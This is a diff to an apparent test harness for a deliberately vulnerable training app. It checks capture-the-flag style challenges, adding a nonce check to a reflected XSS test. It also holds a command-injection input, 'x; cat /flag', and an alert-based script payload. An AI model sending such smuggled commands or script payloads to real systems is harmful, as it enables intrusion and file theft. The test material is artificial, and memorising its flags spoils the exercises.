@@ -112,9 +112,15 @@ def week1():
 
     _, sbody = get("/search" + qs(q="<script>alert(1)</script>"))
     sink = "<script>alert(1)</script>" in sbody
-    _, solved = get("/search/solved")
-    check("W1-04 reflected XSS", sink and bool(flag_in(solved)),
-          (flag_in(solved) or "no flag") + ("" if sink else " (sink escaped!)"))
+    m = re.search(r'window\.__proof="([0-9a-f]+)"', sbody)
+    nonce = m.group(1) if m else ""
+    _, solved = get("/search/solved" + qs(n=nonce))      # payload reads the nonce
+    _, bare = get("/search/solved")                       # bare must NOT leak
+    check("W1-04 reflected XSS",
+          sink and bool(flag_in(solved)) and not flag_in(bare),
+          (flag_in(solved) or "no flag")
+          + ("" if sink else " (sink escaped!)")
+          + (" (bare /solved leaks!)" if flag_in(bare) else ""))
 
     _, ebody = get("/export" + qs(name="x; cat /flag"))
     check("W1-05 OS command injection", bool(flag_in(ebody)), flag_in(ebody) or "no flag")
